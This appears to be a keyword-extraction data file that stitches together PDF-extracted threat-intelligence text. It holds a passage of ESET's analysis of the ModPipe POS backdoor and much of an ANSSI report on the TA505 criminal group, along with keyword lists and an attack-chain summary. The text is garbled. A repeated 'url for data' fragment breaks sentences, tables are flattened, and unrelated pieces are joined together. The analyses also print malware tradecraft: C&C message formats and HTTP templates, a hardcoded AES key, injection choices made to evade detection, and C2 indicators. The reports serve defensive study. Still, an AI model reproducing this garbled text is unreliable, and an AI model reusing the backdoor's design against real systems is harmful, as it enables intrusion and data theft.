using the CMDSEQ command protocol) to the selected IP address on port 2638 used by the SAP Sybase Database Server. The string representing the name of the database is located at offset 0x28 of the response sent by the database server.url for data, ModPipe backdoor hits POS software used in hospitality sector | WeLiveSecurityDatabase server data, such as its name, version of the TDS protocol and the TDS server version. To gain this information, the ModScan module sends a hardcoded TDS 4.2 & 5.0 Login Packet (Figure 6) to the specified IP address on port 2638. The response includes a Login Acknowledgement packet which, in both cases – success and failure – contains information about the database server and the TDS versions used. The TDS login packet is hardcoded, with username set to the built-in dba and a hardcoded password, which is potentially the default password in some RES 3700 POS versions. As we haven’t found any public reference to this password, we won’t be publishing it in our blogpost.Figure 6. TDS 4.2 & 5.0 Login Packet used by the ModScanmodule, dissected using WiresharkDownloadable module: ProcListThe last of the downloadable modules we were able to obtain and dissect was ProcList. This is a lightweight module that doesn’t have an assigned ID. Its main purpose is to collect information about currently running processes, including: name, process identifier (PID), parent process PID, number of threads, token owner, token domain, process creation time, and command line.url for data, ModPipe backdoor hits POS software used in hospitality sector | WeLiveSecurityOptionally, ProcList can also collect information about loaded modules for each of the running processes. Collected information is sent to the main module of the backdoor (using pipe message 0x10000013).Initial dropperThe initial dropper is responsible for installing the next stage of the malware. During our investigation, we discovered one dropper executable on two compromised machines, stored in the following locations:C:\IQXDatabase\Live\1.exe C:\OasisLive\1.exeEach time the initial dropper is executed, a unique configuration is generated, using mostly random bytes. This causes the hash of the dropped loader to change with each execution, complicating detection and tracking of the malware. The dropper component can drop the loader into two possible locations and set up the persistence mechanism by creating a Windows service or Windows registry Run key (for details, please refer to the Indicators of Compromise section).The encrypted payload, containing the main functionality of the dropper, is stored in the dropper’s resources as bitmaps named from A to L. The dropper decrypts this payload using the provided command line parameter, then executes it. The payload is responsible for decrypting the appropriate loader depending on the system architecture, so either 32-bit or 64-bit. Each of the loaders is encrypted using its own XOR key, each 0x80 bytes long. Decompiled code responsible for loading the payload from the binary’s resources, its decryption and execution is shown in Figure 7.url for data, ModPipe backdoor hits POS software used in hospitality sector | WeLiveSecurityFigure 7. Hex-Rays decompiled code – decryption and execution of the payload in the initial dropperurl for data, ModPipe backdoor hits POS software used in hospitality sector | WeLiveSecurityAn example of an encrypted and decrypted configuration with explanations is visible in Figure 8. The configuration shown comes from the loader installed by the dropper sample the configuration can vary between older and newer versions of the loader executable.Figure 8. Example of the loader’s generated configuration (upper is encrypted, lower decrypted)Persistent loaderThis component is responsible for both unpacking the main module and for its injection into one of the following processes:lsass.exe wininit.exe services.exeTo unpack the main module, the persistent loader uses different approaches for the 32-bit and 64-bit versions. While the 32-bit loader is almost identical to the initial dropper – the only difference being the payloads stored in the resources – the 64-bit loader uses completely different “unpacking” code.We have found seven different versions of the loader executables, each having a different compilation timestamp, with the oldest one probably originating in December 2017 and the latest in June 2020. For the full timeline, see Figure 9. A list of all the loader hashes is included in the Indicators of Compromise section.url for data, ModPipe backdoor hits POS software used in hospitality sector | WeLiveSecurityFigure 9. Timeline of known ModPipe variants and their timestamps.Main moduleThe main module is mostly responsible for managing C&C communication and for handling received messages/commands, either from C&C or downloadable modules. To facilitate the communication with modules, the main module starts by creating a pipe with a randomly generated name formatted using the following format string:{%08X-%04X-%04X-%04X-%08X%04X}It then periodically checks the pipe for new messages using the PeekNamedPipe Windows API function. Messages are parsed and handled according to their content. For a full list of recognized pipe commands and messages see Table 3.Table 3. List of pipe message/command typesMessage codeDescription0x10000012 inject and execute received module in specified process0x10000013 data for C&C server (execution logs, stolen data, …)0x10000014 write requested configuration data to the file handle received in this mes-sage (most likely handle to named pipe created by some other module) (main config, network config, loader name, main module PID, )0x10000020 C&C commands (not encrypted) – see Table 4 for the full list of availablecommands0x10000022 set module status (or err code)0x10000023 set C&C communication time intervals0x10000024 close received list of handles0x10000025 get handle of the process with specified PID, duplicate it for some other specified process and send it through the received named pipe handle0x10000072 C&C commands (encrypted) – see Table 4 for the full list of availablecommandsurl for data, ModPipe backdoor hits POS software used in hospitality sector | WeLiveSecurityFor the detailed structure and format used for the messages transferred through the pipe refer to Figure 10.Figure 10. Structure of the main module’s named pipe messagesFor communication with its C&C server, the main module uses HTTP and port 80. Each of the dissected samples contained a list of potentially available servers from which one was randomly chosen. A list of all C&C addresses discovered over the course of our research is available in the Indicators of Compromise section.Messages sent to the C&C (see Figure 11) are constructed and encrypted within the main module’s code.url for data, ModPipe backdoor hits POS software used in hospitality sector | WeLiveSecurityFigure 11. Structure of the messages sent to the C&CBefore any communication with the C&C, the main module generates two clean URLs and uses them to check for an internet connection and a clean-looking cover for the malicious traffic. The URLs use the following format www.%domain%[.]com/?%rand%, where %domain% is randomly chosen from google, bing and yahoo and %rand% is a random 32- bit unsigned integer represented in ASCII.Communication with the C&C is encrypted using AES in CBC mode with the following 128- bit key: F45D076FEC641691A21F0C946EDA9BD5. Before encryption, C&C messages start with a 4-byte checksum, which is calculated as CRC32 (message) XORed with the first 4 bytes of the AES key used to encrypt the message. In the case of the key mentioned above, this would be F4 5D 07 6F.The data is transmitted using the lightweight networking module, which is injected on demand and exits immediately after uploading or downloading the requested message. To select the process for injection, the main module enumerates running processes and assigns them a priority value between 3 and 6. Those with higher priority are injected first, based on the following criteria:Priority 6Priority 5Priority 4The highest priority, assigned to any process that has already been used successfully to inject a networking module, received a response from the C&C and that is still running under the same PID, name and CreationTime.Process name with no extension that matches one of the following process names used for browsers: iexplore, opera, chrome, firefoxProcess name with no extension that matches the following process names: explorer, svchosturl for data, ModPipe backdoor hits POS software used in hospitality sector | WeLiveSecurityPriority 3All the other running processes excluding the following system processes: system, lsass, csrss, lsm, winlogon, smss, wininitThe main reason behind the priority list is to inject processes that are expected to communicate over the network and at the same time avoid system processes that might attract attention if caught communicating over the network.Networking moduleThis ModPipe module is responsible for sending requests to C&C and parsing payload received in the C&C responses. HTTP POST or GET methods with headers shown in Figure 12 and Figure 13 can be used to upload data to C&C and download additional payloads and C&C commands.123456789POST /robots.txt HTTP/1.1Accept: */*Content-Length: %data_length%Content-Type: application/octet-streamUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)Host: %remote_host%Cache-Control: no-cache%data%Figure 12. HTTP POST header used to contact C&C12345GET %rsrc_path% HTTP/1.1Accept: */*User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)Host: %remote_host%Cache-Control: no-cacheFigure 13. HTTP GET message headerurl for data, ModPipe backdoor hits POS software used in hospitality sector | WeLiveSecurityResponses from the C&C server have to be at least 33-bytes long in order to be parsed by the networking module and the malicious payload is located after a sequence of 13 spaces followed by an HTML comment opening tag. An example of a server response including this sequence is shown in Figure 14.Figure 14. Example C&C server response including encrypted payloadIf all conditions are met, the network module sends the C&C response to the main module using a pipe message with ID 0x10000072. The main module then decrypts the payload, verifies its checksum and executes the C&C command. Available commands are listed in Table 4.Table 4. List of available main module commandsCom- mand code0x010x050x0A0x0B0x0C0x0D0x0ECommand descriptionExitUpdate list of C&C addressesInject and execute received module in specified processInject and execute received module in specified process (module name is in- cluded in the command)Optionally write module to the encrypted storage, then inject and execute re- ceived module in specified process – add it to the list of the installed modulesSend command to the named pipe belonging to the module with specified ID and queue the response for the upload to the C&CUninstall module with specified ID (remove from the in-memory list and en- crypted storage)url for data, ModPipe backdoor hits POS software used in hospitality sector | WeLiveSecurityCom- mand code0x0FCommand descriptionSave network configuration to the encrypted storageConclusionModPipe shows quite a few interesting features. Probably the most intriguing finding is the algorithm hidden in one of the backdoor’s modules, which was specifically designed to steal credentials by decrypting them from registry values. By acquiring the database passwords, the attackers gain broad access to sensitive information even though the most sensitive data stored in devices running RES 3700 POS should still be protected by encryption.ModPipe’s architecture, modules and their capabilities also indicate that its writers have extensive knowledge of the targeted RES 3700 POS software. The proficiency of the operators could stem from multiple scenarios, including stealing and reverse engineering the proprietary software product, misusing its leaked parts or buying code from an underground market.To keep the operators behind ModPipe at bay, potential victims in the hospitality sector as well as any other businesses using the RES 3700 POS are advised to:Use the latest version of the software. Use it on devices that run updated operating system and software. Use reliable multi-layered security software that can detect ModPipe and similar threats.Indicators of CompromiseC&C IP addresses191.101.31[.]223 194.32.76[.]192 23.19.58[.]114 88.99.177[.]103 91.209.77[.]172 5.135.230[.]136C&C domains/URLssubzeroday.zapto[.]org shj145ertyb.ddns[.]net/gettime.htmlurl for data, ModPipe backdoor hits POS software used in hospitality sector | WeLiveSecurityouidji12345.ddns[.]net/gettime.htmlDropper samples9F8530627A8AD38F47102F626DEC9F0173B44CD5 0F4355A17AABD3645788341EAC2A9BB759DB95EEFile paths%CSIDL_APPDATA%\Microsoft\Windows\{%rand_guid%}\explorer.exe %WINDIR%\system32\%random_name%.exe%rand_guid% – pseudo-random GUID formatted string %random_name% – from 4 to 7 pseudo-random letters (a-z) with the first one capital e.g. “Cvoeqo.exe”MITRE ATT&CK techniquesNote: This table was built using version 7 of the MITRE ATT&CK framework.Tactic IDNameDescriptionExe- tenceT1059.003 Command and Command ShellT1547.001 Boot or Logon Au- tostart Execution: Registry Run Keys / Startup FolderT1543.003 Create or Modify System Process: Windows ServiceAttackers were seen using Windows Com- mand Shell to execute the initial dropper.ModPipe can use Registry Run key for persistence.ModPipe can create a new service for persistence.url for data, ModPipe backdoor hits POS software used in hospitality sector | WeLiveSecurityTactic IDNameDescriptionPrivi- trationT1134.001 Access Token Ma- nipulation: Token Impersonation/TheftAttackers were seen using partially modified PrintSpoofer tool to drop and subsequently execute loader with SYSTEM privileges.T1055.002 Process Injection:Portable Exe- cutable InjectionT1205Traffic SignalingT1552.002 Unsecured Creden- tials: Credentials in RegistryModPipe can inject it’s modules into various processes.ModPipe’s ModScan module sends random 32-bit values to TCP ports 50123 and 2638 of the specified IP address and requires a specific response in order to continue exe- cuting its scan functionality.ModPipe’s GetMicInfo module retrieves en- crypted database passwords for ORACLE MICROS RES 3700 POS software from Win- dows Registry and uses a custom algorithm to decrypt them before uploading to the C&C.T1057Process Discovery ModPipe’s ProcList module can get informa-tion about processes running on a system.T1012Query RegistryModPipe’s GetMicInfo module queries the Registry for ORACLE MICROS RES 3700 POS version, database passwords and other configuration data.T1033System Owner/User DiscoveryModPipe gathers username and computer name from victim machines and reports them to the C&C in initial message.T1071.001 Application LayerProtocol: Web ProtocolsT1573.001 Encrypted Channel:Symmetric CryptographyModPipe uses HTTP for command and control.ModPipe encrypts communication with C&C using AES in CBC mode.T1041T1029Exfiltration Over C2 ChannelModPipe exfiltrates data over its C&C channel.Scheduled Transfer Default interval used by ModPipe for upload-ing data to C&C is set to 30 minutes.url for data, ModPipe backdoor hits POS software used in hospitality sector | WeLiveSecurityMartin Smolár 12 Nov 2020 - 11:30AMNewsletterDiscussionurl ","{'phrases': ['the initial dropper', 'Windows', 'Shell', 'L.', 'the persistent loader', 'unpacks', 'the main module', 'a system', 'process', 'lsass', 'control', 'communication', 'the networking module', 'modules', 'GetMicInfo', 'ModScan', 'C2', 'database passwords', 'configuration data', 'the Registry', 'IP addresses', 'POS software', 'commands', 'the compromised machine'], 'target': 'the initial dropper; Windows; Shell; L.; the persistent loader; unpacks; the main module; a system; process; lsass; control; communication; the networking module; modules; GetMicInfo; ModScan; C2; database passwords; configuration data; the Registry; IP addresses; POS software; commands; the compromised machine.'}"
TA505; emails; macros; targets; use; the malware; various malware variants; Run; a decoy document; a macro; a folder; a file; the file; The macro; a link; a downloader; the downloader; a downloader; a downloader; a downloader; the downloader; a downloader; a downloader; a downloader; a downloader; a downloader; additional payloads; a downloader; the payload; a downloader; a system; the registry; a downloader; the downloader; the downloader; the dropper; the downloader; files; the downloader; the plugins; the system; the downloader; a downloader; data.,"[' 1. TA505 sends phishing emails with weaponized document attachments using social engineering. 2. Documents contain exploits or macros that execute and download initial droppers/stages from command and control servers. 3. First-stage malware profiles the system and fetches next-stage remote access trojans if deemed a target. 4. RATs like FlawedAmmyy and SDBbot provide access and deploy scripts for reconnaissance like PowerSploit. 5. Credentials are stolen through Mimikatz and privilege escalation is performed until domain admin access. 6. Lateral movement with CobaltStrike and RDP expands control across the network. 7. Ransomware is deployed across critical systems for extortion. Data may also be exfiltrated. 8. Infrastructure shifts rapidly across campaigns to evade detection. Payloads are packed, obscure, and signed. 9. Access to compromised networks may be resold to other groups. Attacks evolve continuously to maximize financial gain. ']","Extract the keywords: TLP:WHITEDEVELOPMENT OF THE ACTIVITY OF THE TA505 CYBERCRIMINAL GROUP20/08/2020TLP:WHITETLP:WHITEDevelopment of the activity of the TA505 cybercriminal groupTable of contents1 TA505 from 2014 to 2017 TLP:WHITETLP:WHITEDevelopment of the activity of the TA505 cybercriminal group1 TA505 from 2014 to 2017It would seem that the TA505 intrusion set goes back to at least 2014 but was only mentioned publicly for the ﬁrst time on Twitter in 2017. Until 2017, its activity seems to have been conﬁned to the distribution of trojans and ransomwares [1].1.1 Malware distributed 1.1.1 Banking trojans In terms of ﬁnal payload, TA505 has always widely used banking trojans that are not speciﬁc to it, such as Dridex and Trickbot:Dridex TA505 is supposed to have distributed the Dridex malware [2] as of July 2014, i.e. one month after its creation (June 2014) [1]. Its use of speciﬁc ID botnets1 within the Dridex network of botnets, controlled by the Evil Corp cybercriminal group, would suggest that TA505 was a Dridex affiliate from 2014 to 2017. ID botnets used by TA505 between 2014 and 2015 would have been botnet IDs 125, 220 and 223. The 220 botnet is thought to have contained 9650 bots in April 2015 [3], and mainly targeted banks [4], particularly in France. In 2016, TA505 is thought to have mainly concentrated on the use of Locky ransomware, to the detriment of Dridex malware, then resumed propagation of Dridex in 2017 through 7200 and 7500 ID botnets. TA505 ﬁnally stopped using Dridex in 2018 [5].Fig. 1.1: Dridex Botnet IDs corresponding to TA5051The number attributed to the version of Dridex associated with a subset of bots it handles. These ID botnets are used to differentiate theactivity of each of its affiliates and associate different ID botnets with the same operator.20/08/2020Page 3 of 20TLP:WHITETLP:WHITEDevelopment of the activity of the TA505 cybercriminal groupTrickBot TA505 is also thought to have been an affiliate of TrickBot2, known under the pseudonym of mac1 [5]. The use of TrickBot by TA505 only lasted a few months in 2017. For example, a campaign dating back to June 2017 targeted France and the United Kingdom [5].1.1.2 Ransomware 2016 saw the appearance of Locky ransomware. Frequently used, it has targeted many victims. Like Dridex, Locky works on the principle of affiliates [1].According to Proofpoint, affiliate number 3 of Locky and the affiliate of ID botnet Dridex 220, TA505, have points in common, such as similar lures on their phishing emails and very strong similarities regarding Javascript, VBScript codes and Microsoft Word macros used [7]. There is also an absence of Dridex 220 campaigns concomitant with the emergence of Locky [8]. Proofpoint [7] also pinpoints links between Locky and the affiliate of Dridex ID botnet 7200, TA505 at this time, comparing Dridex 2017 campaigns with Locky past campaigns [1]. TA505 is therefore presumed to be affiliate number 3 (”Affid=3”) of this ransomware.Although the main ransomware used by the group remains Locky, TA505 is thought to occasionally use other ran- somwares (Bart3, Jaff 4, Scarab 5, Philadelphia6, GlobeImposter7 and GandCrab8).Locky stopped operating in 2017.1.2 Distribution and compromise methods TA505 seems to have distributed its malware only through phishing email campaigns. This intrusion set was char- acterised by its massive use of Necurs botnet (see appendix in chapter 5) for the distribution of emails [9].Comment: open source reports associate all ransomwares distributed by the Necurs botnet to TA505. However, some of these ransomwares were used over the same periods. It seems unlikely that TA505 operated as many encryption codes at the same time. It is more likely that Necurs had several clients simultaneously.This intrusion set relies exclusively over that period on social engineering to run its payload contained in malicious attachments linked to emails sent [9]. These attachments could be zip or 7zip archives containing VBS script or Javascript to be run by their victims, HTML pages containing malicious Javascript, or Offices documents bugged with malicious macros.Although TA505 does not seem to have used software vunerability to compromise its targets, it is interesting to observe that it has kept up to speed with the latest social engineering techniques. It therefore distributed bugged Office documents via the DDE mechanism less than a month after the potential abuse of this feature became common knowledge [10].2Trickbot, which appeared in October 2016, and a derivative of Dyre, possibly operated by members of the Business Club until November 2015. Reminder: the Business Club was responsible for JabberZeuS and GameOverZeuS(GoZ) malware. When the GoZ botnet was dismantled, the Business Club is thought to have divided its activites between Dridex and Dyre malware. Trickbot could be operated by former members of the Business Club, or by a copycat having acquired the source code of Dyre [6].3ransomware which was very limited during 2016. 4ransomware active from May to June 2017. 5Variant of the ﬁrst open-source Hidden Tear ransomware (published in 2015), used for the ﬁrst time by TA505 in June 2017. 6Ransomware-as-a-Service available for 400 dollars on the Dark Web. 7ransomware used from July to December 2017. 24 campaigns distributing GlobeImposter were found by Proofpoint in December 2017 [9,5]8Ransomware-as-a-Service used from January to March 2018 [5]20/08/2020Page 4 of 20TLP:WHITETLP:WHITEDevelopment of the activity of the TA505 cybercriminal group2 Development of TA505 since 2018The year 2018 was a turning point in the attack methods of the intrusion set. TA505 gradually reduced its distribu- tion of malicious banking codes and ransomwares to move into the distribution of backdoors.However, this intrusion set does not seem to be content with running a payload on its victim’s computer. When it deems it useful, TA505 tries to compromise the entirety of the information system (IS) it penetrated.It also seems, in some cases, to resell accesses to the backdoors it has installed, which makes it difficult to distinguish between speciﬁc TA505 activities and those of potential clients.The chain of attack described in this chapter corresponds to the activities that ANSSI believes are linked to the intrusion set.2.1 Infection vector The only infection vector currently known to be used by the TA505 intrusion set is phishing emails including a malicious attachment or link. Until 2018, the intrusion set relied practically exclusively on the Necurs botnet to distribute its payloads. However, following the unavailability of the botnet in January and February 2018, TA505 seems to have less often used its services [9].This last point however is uncertain as there is little information on the alternative email distribution methods of the intrusion set. Given that TA505 has often deployed an email credentials theft implant among its victims [11][12], it is possible that it accumulates email addresses to distribute its new phishing campaigns.It has also been mentioned that some of its phishing emails had been distributed via machines infected by the Amadey [11] malware. Given that TA505 also uses Amadey malware as indicated in section 2.3.1, it may have cre- ated its own Amadey botnet to distribute its malicious emails, or may use the services of an existing Amadey botnet.This operating mode also usurps the recipient addresses of its emails, which makes it difficult to analyse its email distribution infrastructure [13].2.2 Social engineering The intrusion set continues to rely on social engineering to run its malicious payloads on the machines of its email .url [14], .iqy [9], recipients, using several formats for attachments to work around its targets’ security systems: SettingContent-ms [15], MS publisher ﬁles [16], .wiz and .pub [17], .iso [18]. The aim of these documents was often to run msiexec9 commands via macros on the victim’s machine to upload and run a malware.However, in the second half of 2019 and ﬁrst half of 2020, TA505 seems to have modiﬁed and stabilised its social engineering scheme. It now sends an HTML page as an attachment containing malicious Javascript code. This code redirects the victim towards an URL of a legitimate but compromised website.This same URL corresponds to an HTML page containing a minimal Javascript code redirecting the victim towards a page hosted by a machine controlled by the intrusion set. This page mimicks that of a legitimate ﬁle-sharing site adapted to the target such as Onedrive, Dropbox [19] or Naver10 (during one of its campaigns in South Korea) [20]. The victim is then encouraged to download, open and enable VBA macros of an Office document, usually Excel, containing a malicious payload .9Tool used to interact in command line with the installation, updating and de-installation engine of software speciﬁc to Microsoft operatingsystems10Korean internet portal service.20/08/2020Page 5 of 20TLP:WHITETLP:WHITEDevelopment of the activity of the TA505 cybercriminal groupFig. 2.1: Initial TA505 compromise methodThe intrusion set gradually increases the complexity of its social engineering method. In October 2019, it is thought to have directly sent links towards phishing pages in its malicious emails. It then used URL shorteners to mask these malicious links.In late February 2020, it abandoned the URL shortener strategy and started to use HTML attachments with Javascript with redirection from a compromised site, which made it even more difficult to detect its emails. Furthermore, some of its redirection pages integrate a link towards iplogger.org, a service allowing the intrusion set to inspect IP ad- dresses visiting these pages[21].Finally, it has already been observed that the phishing pages of the intrusion set distributed empty Office documents when a person other than the victim visited them. This behaviour can be explained by the fact that the intrusion set ﬁlters the IP addresses to which it chooses to distribute its malicious documents or only distributes them within limited time slots.2.3 Initial compromise TA505 has a varied attack arsenal to be deployed among its victims having run its malicious attachments. It consists of codes available both publicly and commercially on the black market or which seem to be exclusive to it. It therefore has malware development capabilites or ﬁnancial resources to obtain them. The intrusion set deploys its arsenal in several stages and has different codes for each of them.2.3.1 Stage 1 codes The TA505 intrusion set seems to have tested several stage 1 codes11. It brieﬂy used the following codes:11a stage 1 code is deﬁned here as an implant with limited features aimed at deploying a more sophisticated code and possibly rapidly performingreconnaissance of the infected system to help the intrusion set determine if the victim and their IS are of interest.20/08/2020Page 6 of 20TLP:WHITETLP:WHITEDevelopment of the activity of the TA505 cybercriminal group• Quant Loader is a simple, low-cost downloader available on the black market. The intrusion set used it fromJanuary to April 2018 [9].• Marap is a downloader that seems speciﬁc to the intrusion set. Athough it has a modular structure and a known reconnaissance module, few attacks using this code have been documented and the intrusion set does not seem to have used it since August 2018 [22].• Amadey is a downloader available on the black market. This code is thought to have been used from Aprilto June 2019 by the intrusion set [23].• Andromut, also known as Gelup, is a downloader that seems speciﬁc to the intrusion set. This code differs from the previous ones by setting up anti-analysis mechanisms. However, no occurrence of this code seems to have been detected apart from in summer 2019 [24].The TA505 intrusion set therefore does not seem to hesitate to discard some of its malwares in order to test oth- ers. Despite that, a trend does emerge: it seems to more regularly use the stage 1 malware Get2, whose backdoor component is also called Friendspeak [13]. Since the ﬁrst publication of this malware in September 2019 [19], the intrusion set regularly uses it.Get2 performs a basic reconnaissance of the machine it infects by sending to its C2 server information such as the name of the infected machine, the name of the user, the version of the Windows operating system and list of active processes on the machine. In return, if the machine is deemed to be of interest, it receives the URL to which it can upload the next stage malware.Fig. 2.2: Timeline of the stage 1 codes used by TA5052.3.2 Second-level codes Once its stage 1 code has been deployed, the intrusion set can deploy several malwares.• The FlawedAmmyy malware exists since 2016 and is built from the source code of the publicly disclosed legitimate remote-administration tool Ammyy Admin. Although it has RAT12 features, FlawedAmmyy has also been used by the intrusion set as a stage 1 code. The intrusion set is thought to have used it between March 2018 and September 2019 [18]. FlawedAmmyy seems to be exclusively used by TA505 since 2018. However, this backdoor is thought to have been used before this time period, when TA505 did not use this type of code yet. It is therefore not entirely conﬁrmed that FlawedAmmyy is exclusive to TA505.• The tRat malware was used by TA505 in October 2018 [16]. Little information is available about this door. Modules need to be downloaded for the backdoor to acquire features, yet none of its modules have been documented.• Remote Manipulator System, also called RMS or RmanSyS, is a legitimate tool developed by the Russian company TEKTONIT, used for malicious purposes. This tool is available free of charge for non-commercial purposes and corrupted versions are also available on the black market. TA505 is thought to have started to deploy this tool from November 2018, and until June 2019 [25].12Remote Administration Tool20/08/2020TLP:WHITEPage 7 of 20TLP:WHITEDevelopment of the activity of the TA505 cybercriminal group• The ServHelper backdoor comes in two [17] versions: one version acts as a stage 1 code, the other has RAT features. The intrusion set is supposed to have used this backdoor over a period covering at least from Novem- ber 2018 to August 2019 [18]. ServHelper does not seem speciﬁc to the intrusion set: several IT security re- searchers have observed attacks in which it was involved but also using methods and tools that are different from those of TA505 [5][18][26].• FlawedGrace, also known as Gracewire, is a backdoor with standard RAT features. It was mentioned for being used for the ﬁrst time by TA505 in December 2018 [17] and is thought to be still used by it in 2020 [27]. Like FlawedAmmyy, TA505 seems for the time being to be the only one to use this backdoor. However its existence prior to 2018 makes it uncertain whether it was used by TA505 exclusively.• The FlowerPippi backdoor was detected once in June 2019 [11]. This malware has basic RAT features and itis also designed to be used as a stage 1 code by offering initial recognition of the infected system.• SDBbot is a malware that seems to be speciﬁc to the intrusion set. Its ﬁrst use was probably September 2019[20] and the intrusion set has constantly used it since.Fig. 2.3: Timeline of the stage 2 codes used by TA5052.4 Compromising of the information system Once its malwares are installed, the intrusion set can try to lateralise itself within a compromised network. Its goal is to become the domain administrator. To achieve this, it uses several methods.2.4.1 Exploration of the IS The intrusion set scans the network to collect more information on the IS and discover vulnerable services [28]. One of the tools used by TA505 is the PowerSploit suite, a set of PowerShell scripts available in open-source and used to test the security of an IT network. The intrusion set particularly focuses on the Active Directory of the IS and has already deployed in the past another penetration test tool, PingCastle, to test conﬁguration weaknesses affecting that service.Although crucial to take over the network, the intrusion set does not necessarily seem to perform these operations ﬁrst. In several cases observed, the intrusion set ﬁrstly tends to try to compromise several other machines before scanning the IS and the Active Directory.The intrusion set seems to continue its network mapping work after having compromised the credentials of a domain administrator. It has already been observed that TA505 used a query software of Active Directory called AdFind on a domain controller to fully map an IS of which it had become the domain administrator.20/08/2020Page 8 of 20TLP:WHITETLP:WHITEDevelopment of the activity of the TA505 cybercriminal group2.4.2 Increasing privileges The method preferred by TA505 to increase its privileges and lateralise throughout a network seems to be the collection of credentials on compromised machines. The Mimikatz collection tool, available free of charge in open- source, is regularly used by the intrusion set and other tools of this type may also have been used. Unconﬁrmed hypotheses have also been made on the use of MS17-010 vulnerability 13 by the intrusion set [28].2.4.3 Lateralisation To facilitate its lateralisation operations and increase its robustness within a compromised network, the intrusion set has very frequently used Cobalt Strike, a penetration testing framework, and the TinyMet tool14. However, TA505 also often uses native Window tools such as WMIC and RDP to run its malware on new machines by using stolen credentials.2.5 Actions on objective 2.5.1 IS encryption The main goal of the intrusion set is to deploy ransomware. The use of ransomware by this intrusion set goes back to at least 2016 with its use of the Locky malware.Major developments since 2018 can be explained by the fact that TA505 now seeks to use ransomware to compro- mise entities liable to pay a high ransom (big game hunting) and to encrypt all the machines of the compromised IS.During TA505-related attacks, Clop ransomware, also called Ciop, was deployed. This malware was observed for the ﬁrst time in February 2019 [20]. It has no automatic propagation functions. Consequently, the intrusion set uses some speciﬁc tools to deploy it within a whole IT system. Using a script, it deploys a malware, poorly documented in open-source but until now systematically called « sage.exe » by the intrusion set, on several machines [28]. These machines then connect to all the machines of the victim IS to successively run two payloads on each of them with a domain administrator account:• a malware called DeactivateDefender whose aim is precisely to disable Windows Defender [20][28]; • the ransomware itself.It is probable that TA505 relies on the network mappings performed during the gradual compromission of the IS to choose the machines on which to run « sage.exe » and maximise the impact of its ransomware.An occurrence of use of the Rapid ransomware by TA505 was also observed by the South Korean Financial Security A website was created in March 2020 to publish exﬁltrated data of Clop ransomware victims not having paid their ransom, probably to increase pressure on future victims. A release was published by the attackers stating that should a hospital be accidentally victim of their ransomware, the data decrypter would be immediately provided. If, as sugested in section 2.5.3, Clop is speciﬁc to TA505, this illustrates the capability of this intrusion set to follow a trend initiated by other ransomware operators [29].This trend is also interesting as it indicates that the intrusion set is required to exﬁltrate data of its victim’s IS. If such data were to exceed a certain volume, it is then probable that TA505 needs to deploy speciﬁc tools and infrastructure for this task. Such things have not yet been observed for this intrusion set. 13Critical vulnerability in the SMB service(Server Message Block) of Windows-run machines. This vulnerability was used during the WannaCry14This tool, freely available in open-source, is a particularly small loading code used to download and run the Meterpreter penetration testinginternational campaign in 2017.tool.20/08/2020Page 9 of 20TLP:WHITETLP:WHITEDevelopment of the activity of the TA505 cybercriminal group2.5.3 Spéciﬁcity of Clop for TA505 ANSSI had mentioned a technical link between Clop ransomware and TA505. Indeed, Clop and FlawedAmmyy had been signed by the same valid but malicious security certiﬁcate [30].To this, it is possible to add that these two malwares were compiled in similar environments and modiﬁed at the same time to change the letter « l » into « i » uppercase [20] in their chains. Furthermore, they have the same characteristic name « swaqp.exe » in separate attacks.It therefore seems probable that one single intrusion set handles both codes. Given that TA505 is the only one to have been seen to use them since 2018, it seems that both codes are speciﬁc to it.2.6 Evasion methods The intrusion set multiplies strategies to minimise the detection of its malware. Besides the use of attached doc- ument with unusual formats mentioned in section 2.2, TA505 has also used Excel 4.0 type macros. These very old macros were not often detected by security solutions during their adoption by the intrusion set. Likewise, TA505 relies heavily on native Windows tools, which require closer supervision of the IS to detect their malicious use.2.6.1 Use of compression codes TA505 uses a compression code15 to make it more difficult to analyse its malware. This code, called Minedoor [13], was used to compress both early stage malwares such as FlawedGrace, and ﬁnal codes deployed by TA505 such as Clop or DeactivateDefender [31].Although this compression code is a valuable way to monitor TA505’s arsenal, caution is required. Attacks using codes protected by Minedoor with very different kill chains from that of TA505 have already been observed [13]. The intrusion set signs its malware by using legitimate but malicious security certiﬁcates. They often take over names of existing businesses. TA505’s codes are therefore more difficult to detect [20].Like the Minedoor malware, it is not certain that all the malware signed by the certiﬁcates used by TA505 are linked to this intrusion set. Indeed it may be that TA505 used a third party to sign its codes and that this same third party may reuse those certiﬁcates to sign the malware of other intrusion sets.2.7 Attack infrastructure As mentioned in section 2.1, the infrastructure used by the intrusion set to distribute its emails is not widely docu- mented.TA505 particularly seems to rent its infrastructure to conduct its operations, in particular to host its malicious Of- ﬁce documents and for its Get2 C2 servers16. The life cycle of this infrastructure is usually less than a month and the intrusion set permanently generates new domain names. These domain names often consist of several words separated by « - » and usually try to typosquat17 ﬁle-sharing services such as Onedrive ou Onehub for example.TA505 is thought to use a different strategy for the C2 servers of its penetration tools such as TinyMet or Cobalt Strike. It directly uses IP adresses as C2 servers and not domain names but still relies on a rented infrastucture.15Called packer. 16Command and control servers: these machines are used to send instructions to malware and receive results. 17Show strong similarities with another domain name for misleading purposes.20/08/2020Page 10 of 20TLP:WHITETLP:WHITEDevelopment of the activity of the TA505 cybercriminal groupLittle information is available about the infrastructure compromised by TA505. Web servers compromised by the intrusion set were analysed in February 2019 [20], indicating that several copies of the malicious web console Files- man had been found as well as a non-documented Linux backdoor.2.8 Targeting Although they only represent a fraction of the intrusion set’s real activity, the table below presents a set of cam- paigns conducted by TA505, documented in open-source since 2018.PeriodJanuary 2018August 2018September-October 2018November 2018December 2018Targeted geographical areaN/AN/AN/AN/AN/ANovember-December 2018United StatesChile, India, Italia, Malawi,Pakistan, South Africa, South Korea, China,United Kingdom, France, United StatesSouth KoreaN/AChile, Mexico, Italia, China,South Korea, TaiwanUnited Arab Emirates, South Korea,Singapore, United States, Saudi Arabia, MoroccoUnited States, Bulgaria, Turkey, Serbia,India, Philippines, IndonesiaJapan, Philippines, ArgentinaSaudi Arabia, OmanTurkeyDecember 2018 – March 2019February 2019April 2019April 2019June 2019June-July 2019June 2019July-August 2019July-August 2019September 2019September 2019Targeted sectorAutomotive industrySource [14]FinancialFinancialFinancialRetailFinancialRetailFood industry HospitalityN/AFinancialN/AN/ABanksN/AGovernment agencyGovernment agencyEducationFinancialFinancial, Healthcare,Retail,Education Research[22][32][17][17][33] [34][25][20][35][23][11][19] [18] 